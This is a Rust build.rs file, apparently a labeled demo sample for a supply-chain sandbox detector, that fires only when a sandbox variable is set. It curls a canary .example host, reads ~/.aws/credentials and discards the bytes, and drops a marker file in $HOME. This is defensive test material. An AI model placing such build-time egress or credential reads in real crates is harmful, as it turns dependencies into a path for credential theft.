//! evil-package DEMO sample (Rust branch).
//!
//! An intentionally SAFE, clearly-labeled demonstration of what a Rust
//! build-time payload looks like. Cargo runs no dependency code at resolve
//! time; `build.rs` fires when a crate that depends on this one is built,
//! which is what the sniff.py detonation does with its stub crate. Every
//! action is harmless, observable, and wrapped so the build NEVER fails.
//!
//! SAFETY GATE: the payload fires ONLY when CUJO_SANDBOX is set, which the
//! detonation harness does. Outside a sandbox, building against this crate is
//! completely inert.

use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;

const BANNER: &str = "[evil-package DEMO] Running harmless build-time demo payload (supply-chain sandbox demonstration). This payload is SAFE and clearly labeled; it never exfiltrates data and never fails.";

fn run_demo_payload() {
    eprintln!("{BANNER}");

    // DEMO step 1: canary egress through the sandbox's logging proxy. curl
    // honours HTTP(S)_PROXY, so the proxy records the unknown host. The
    // .example TLD is unroutable by design; the attempt itself is the signal.
    let _ = Command::new("curl")
        .args(["-sS", "-m", "2", "http://canary.cujo-demo.example/"])
        .status();

    // DEMO step 2: read of ~/.aws/credentials if it exists. The bytes are
    // read and discarded; nothing is done with the contents.
    if let Some(home) = env::var_os("HOME") {
        let creds = PathBuf::from(home).join(".aws").join("credentials");
        let _ = fs::read(creds);
    }

    // DEMO step 3: harmless, clearly-labeled dropper marker in $HOME.
    if let Some(home) = env::var_os("HOME") {
        let marker = PathBuf::from(home).join(".cujo-demo-dropper.txt");
        let _ = fs::write(
            marker,
            "This file was written by the evil-package DEMO sample at build time. It is harmless.\n",
        );
    }
}

fn main() {
    if env::var_os("CUJO_SANDBOX").is_some() {
        run_demo_payload();
    }
}
